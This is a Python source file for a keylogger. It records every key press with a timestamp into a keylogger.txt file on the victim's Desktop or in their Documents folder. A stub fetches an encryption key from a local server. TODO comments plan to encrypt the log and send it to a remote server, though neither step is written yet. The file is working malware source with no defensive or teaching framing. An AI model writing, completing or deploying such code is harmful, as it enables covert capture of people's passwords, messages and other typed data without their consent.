# TODO: Function to encrypt keylogger.txt
# TODO: Function to send keylogger data to remote server
# TODO: Script to decrypt keylogger.txt

from pynput.keyboard import Listener
import os
import platform
import requests
import time
import nacl.secret
import nacl.box


def get_filepath():
    username = os.getlogin()
    log_name = 'keylogger.txt'
    if platform.system() == 'Windows':
        return "C:\\Users\\{}\\Desktop\\{}".format(username, log_name)
    elif platform.system() == 'Darwin':
        return '/Users/{}/Desktop/{}'.format(username, log_name)
    else:
        return '/home/{}/Documents/{}'.format(username, log_name)


def get_key():
    url = 'http://localhost:8080/mykey.key'
    f = requests.get(url)
    key = f.text.rstrip("\n")
    return key


def encrypt_file(file, key):
    print(file)
    print(key)


def key_handler(key_press):
    fp = open(r"{}".format(get_filepath()), 'a')
    fp.write('{} pressed at time:{}\n\n'.format(key_press, time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())))


def run():
    #key = get_key()
    log_dir = get_filepath()
    with Listener(on_press=key_handler) as listener:
        listener.join()


if __name__ == '__main__':
    run()
